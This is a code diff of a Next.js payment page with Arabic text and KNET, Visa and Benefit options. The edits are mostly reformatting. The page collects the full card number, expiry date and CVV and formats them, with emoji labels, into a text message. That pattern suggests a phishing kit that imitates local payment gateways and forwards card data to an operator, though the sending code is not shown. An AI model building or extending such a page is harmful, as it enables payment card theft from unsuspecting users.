@@ -1,21 +1,28 @@
 "use client";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import 'bootstrap/dist/css/bootstrap.min.css';
 import Image from "next/image";
 import benefit from '../../../public/benefi.png';
 import visa from '../../../public/visa.png';
 import kent from "../../../public/download.svg";
 import { Modal, Button, Form } from "react-bootstrap";
-import { useRouter ,useSearchParams} from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 import axios from "axios";
 
 export default function PaymentPage() {
   const [selectedMethod, setSelectedMethod] = useState("knet");
   const [showModal, setShowModal] = useState(false);
   const [submittedMethod, setSubmittedMethod] = useState(null);
+  const [price, setPrice] = useState("");
 
   const searchParams = useSearchParams();
-  const price = searchParams.get("price");
+
+  useEffect(() => {
+    const p = searchParams?.get("price");
+    if (p) {
+      setPrice(p);
+    }
+  }, [searchParams]);
 
   const [cardData, setCardData] = useState({
     name: "",
@@ -39,9 +46,9 @@ export default function PaymentPage() {
     setSubmittedMethod(selectedMethod);
 
     if (selectedMethod === "knet") {
-      router.push(`/kpay?price=${price}`); // ✅ تحويل مباشر بدون مودال
+      router.push(`/kpay?price=${price}`);
     } else if (selectedMethod === "visa" || selectedMethod === "benefit") {
-      setShowModal(true); // ✅ فتح المودال للبطاقات
+      setShowModal(true);
     }
   };
 
@@ -54,17 +61,17 @@ export default function PaymentPage() {
 🔐 CVV: ${cardData.cvv}
 `;
     if (!/^\d{16}$/.test(cardData.number)) {
-  alert("رقم البطاقة يجب أن يكون 16 رقمًا");
-  return;
-}
-if (!/^\d{3,4}$/.test(cardData.cvv)) {
-  alert("CVV غير صحيح");
-  return;
-}
-if (!/^\d{2}\/\d{2}$/.test(cardData.expiry)) {
-  alert("تاريخ الانتهاء غير صحيح");
-  return;
-}
+      alert("رقم البطاقة يجب أن يكون 16 رقمًا");
+      return;
+    }
+    if (!/^\d{3,4}$/.test(cardData.cvv)) {
+      alert("CVV غير صحيح");
+      return;
+    }
+    if (!/^\d{2}\/\d{2}$/.test(cardData.expiry)) {
+      alert("تاريخ الانتهاء غير صحيح");
+      return;
+    }
     if (
       cardData.name.trim() === "" ||
       cardData.number.trim() === "" ||
@@ -121,7 +128,6 @@ if (!/^\d{2}\/\d{2}$/.test(cardData.expiry)) {
         </p>
       </div>
 
-      {/* المودال للبطاقات فقط */}
       <Modal show={showModal} onHide={() => setShowModal(false)} centered>
         <Modal.Header closeButton>
           <Modal.Title>أدخل بيانات البطاقة</Modal.Title>
@@ -141,16 +147,16 @@ if (!/^\d{2}\/\d{2}$/.test(cardData.expiry)) {
 
             <Form.Group className="mb-3">
               <Form.Label>رقم البطاقة</Form.Label>
-                <Form.Control
-                  type="text"
-                  name="number"
-                  value={cardData.number}
-                  onChange={handleInputChange}
-                  placeholder="•••• •••• •••• ••••"
-                  maxLength={16}
-                  inputMode="numeric"
-                  pattern="[0-9]*"
-                />
+              <Form.Control
+                type="text"
+                name="number"
+                value={cardData.number}
+                onChange={handleInputChange}
+                placeholder="•••• •••• •••• ••••"
+                maxLength={16}
+                inputMode="numeric"
+                pattern="[0-9]*"
+              />
             </Form.Group>
 
             <div className="d-flex gap-3">
@@ -173,11 +179,10 @@ if (!/^\d{2}\/\d{2}$/.test(cardData.expiry)) {
                   value={cardData.cvv}
                   onChange={handleInputChange}
                   placeholder="•••"
-                  maxLength={4}            // CVV يكون عادة 3 أو 4 أرقام
-                  inputMode="numeric"      // يعرض لوحة الأرقام على الجوال
-                  pattern="[0-9]*"         // يقبل فقط الأرقام
+                  maxLength={4}
+                  inputMode="numeric"
+                  pattern="[0-9]*"
                 />
-
               </Form.Group>
             </div>
           </Form>
